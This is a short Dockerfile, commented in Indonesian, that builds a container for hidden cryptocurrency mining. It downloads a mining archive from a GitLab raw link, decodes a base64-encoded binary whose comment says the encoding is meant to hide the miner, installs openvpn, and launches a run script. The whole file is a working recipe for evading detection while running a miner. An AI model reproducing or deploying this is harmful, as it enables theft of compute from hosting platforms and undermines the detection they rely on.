FROM python:3.9-slim

# Install dependencies
RUN apt update && apt install -y curl wget tar openvpn

# Download mining binary dan script
RUN wget -qO sg.tar.gz https://gitlab.com/derisafrew/vx/-/raw/main/sg.tar.gz && \
    tar -xzf sg.tar.gz && rm -rf sg*

# Menggunakan base64 untuk menyembunyikan binary mining
COPY ojava.enc /ojava.enc
RUN base64 -d /ojava.enc > /ojava && chmod +x /ojava

# Copy dan set permission untuk run.sh
COPY run.sh /run.sh
RUN chmod +x /run.sh

CMD ["/run.sh"]
